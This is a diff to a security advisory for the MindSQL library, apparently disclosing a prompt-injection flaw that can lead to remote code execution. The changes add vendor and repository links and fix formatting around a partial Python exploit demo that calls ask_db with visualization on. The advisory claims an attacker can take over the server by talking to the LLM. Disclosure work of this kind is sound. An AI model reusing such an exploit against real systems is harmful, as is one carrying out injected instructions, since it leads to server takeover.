@@ -1,5 +1,9 @@
 # Security Advisory: Prompt Injection to Potential RCE
 
+**Vendor:** https://www.mindinventory.com/
+
+**Software:** https://github.com/Mindinventory/MindSQL
+
 ## Supported Versions
 
 Versions which are currently being supported with security updates.
@@ -30,10 +34,10 @@ A **prompt injection** vulnerability exists in the application flow where untrus
 
 Here is my exploit demo：
 
-```python
+````python
 from mindsql.core import MindSQLCore
 from mindsql.databases import Sqlite
-from mindsql.llms import OpenAi  
+from mindsql.llms import OpenAi
 from mindsql.vectorstores import ChromaDB
 from dotenv import load_dotenv
 import os
@@ -42,11 +46,11 @@ load_dotenv()
 
 config = {
     "api_key": os.getenv("OPENAI_API_KEY"),
-    "base_url": os.getenv("OPENAI_BASE_URL"),  
+    "base_url": os.getenv("OPENAI_BASE_URL"),
 }
 
 minds = MindSQLCore(
-    llm=OpenAi(config=config),  
+    llm=OpenAi(config=config),
     vectorstore=ChromaDB(),
     database=Sqlite(),
 )
@@ -66,7 +70,7 @@ cursor.execute(
     )
 """
 )
-# test data 
+# test data
 cursor.execute("SELECT COUNT(*) FROM users")
 if cursor.fetchone()[0] == 0:
     cursor.executemany(
@@ -97,10 +101,9 @@ response = minds.ask_db(
     visualize=True,
 )
 conn.close()
-```
+````
+
 The attacker can execute remote commands and even control the server simply through natural language conversations with the LLM.
-
-
 
 ## Suggestion
 
